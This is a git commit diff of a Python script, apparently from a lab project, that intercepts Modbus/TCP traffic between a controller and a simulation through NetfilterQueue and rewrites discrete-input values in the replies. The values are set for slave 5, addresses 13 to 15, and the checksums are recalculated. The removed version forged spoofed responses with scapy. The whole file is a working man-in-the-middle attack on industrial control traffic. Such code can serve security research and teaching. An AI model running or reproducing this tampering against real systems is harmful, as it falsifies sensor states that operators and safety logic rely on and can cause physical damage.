3c9dab21e5d8fec6588d93383603cb9745e3d4b2
Klagarge <remi@heredero.ch>
2024-07-23 10:56:20 +0200

    CHG filter and edit msg from queue

--- main.py
+++ main.py
@@ -1,74 +1,62 @@
-from scapy.all import *
-from scapy.sendrecv import send
+from netfilterqueue import NetfilterQueue as nfq
 from scapy.layers.inet import TCP, IP
+from scapy.all import *
+
+transaction = {}
+monitor_discrete_input = {}
 
 
-slave_id = 5
-discrete_input_address = 15
-transaction_ids = set()
+def add_monitor_discrete_input(slave_id, address, value_should_be):
+    monitor_discrete_input[(slave_id, address)] = value_should_be
 
 
-def modify_modbus_packet(pck):
-    global transaction_ids
+def packet_listener(pck):
+    global transaction, monitor_discrete_input
 
-    if TCP in pck:
-        foo = pck[TCP].payload
-        payload = bytes(pck[TCP].payload)
-        foo
+    scapy_packet = IP(pck.get_payload())
+    if TCP in scapy_packet and (
+            scapy_packet.src == '192.168.39.110' or  # Simulation
+            scapy_packet.src == '192.168.37.163'  # Controller
+    ):
+        payload = bytes(scapy_packet.payload.payload)
         if len(payload) < 8:
-            return None
+            pck.accept()
+            return
 
         function_code = payload[7]
 
-        if pck[TCP].dport == 1502:
+        if scapy_packet.dport == 1502:
             unit_id = payload[6]
             transaction_id = payload[0:2]
-            if function_code == 2 and unit_id == slave_id:
+            if function_code == 2:
                 start_address = (payload[8] << 8) + payload[9]
-                quantity = (payload[10] << 8) + payload[11]
-                if start_address <= discrete_input_address < start_address + quantity:
-                    transaction_ids.add(transaction_id)
-                    answer = pck.copy()
-                    answer[TCP].dport = pck[TCP].sport
-                    answer[TCP].sport = pck[TCP].dport
-                    answer[IP].src = pck[IP].dst
-                    answer[IP].dst = pck[IP].src
-                    sequence = b'\x00\x00\x00\x04\x05\x02\x01\x01'
-                    answer_payload = transaction_id + sequence
-                    # b'\x00\x01\x00\x00\x00\x04\x05\x02\x01\x00'
-                    answer[TCP].payload = Raw(load=answer_payload)
-                    print("Answer: \n", answer.show(dump=True))
-                    send(answer, iface="eth0")
-            send(pck, iface="eth0")
-        elif pck[TCP].sport == 1502:
+                key = (unit_id, start_address)
+                if key in monitor_discrete_input:
+                    transaction[transaction_id] = monitor_discrete_input[key]
+                    print("Monitoring discrete input: ", key, " to ", monitor_discrete_input[key])
+        elif scapy_packet.sport == 1502:
             transaction_id = payload[0:2]
-            if transaction_id in transaction_ids:
-                # transaction_ids.remove(transaction_id)
+            if transaction_id in transaction:
                 byte_count = payload[8]
                 input_status = payload[9:9 + byte_count]
+                value_to_set = transaction[transaction_id]
+                transaction.pop(transaction_id)
 
-                if input_status != b'\x00':
-                    payload = payload[:9] + bytes([0]) + payload[10:]
-                    pck[TCP].payload = Raw(load=payload)
+                if value_to_set is not None and input_status != bytes([value_to_set]):
+                    payload = payload[:9] + bytes([value_to_set]) + payload[10:]
+                    scapy_packet.payload.payload = Raw(load=payload)
+                    del scapy_packet[IP].chksum
+                    del scapy_packet[TCP].chksum
+                    del scapy_packet.chksum
+                    print("Modified packet id: ", transaction_id, " to ", value_to_set)
+                    pck.set_payload(bytes(scapy_packet))
 
-                    # Recalcule les checksums
-                    # del pck[IP].chksum
-                    # del pck[TCP].chksum
-                    sendp(pck, iface="eth0")
-                    # print("modified packet: \n", pck.show(dump=True))
-                    return 1
-            send(pck, iface="eth0")
-
-    return None
-
-
-def packet_callback(p):
-    modified_packet = modify_modbus_packet(p)
-    # if modified_packet:
-    # print("Packet modified")
-    # send(IP(dst='192.168.42.42') / TCP(dport=1502, flags='S'), iface="eth0")
-    # else:
-    # print("original packet")
+    pck.accept()
 
 
-sniff(filter="tcp port 1502", prn=packet_callback, store=0, iface="eth0")
+add_monitor_discrete_input(5, 15, 0)
+add_monitor_discrete_input(5, 14, 1)
+add_monitor_discrete_input(5, 13, 1)
+queue = nfq()
+queue.bind(1, packet_listener)
+queue.run()
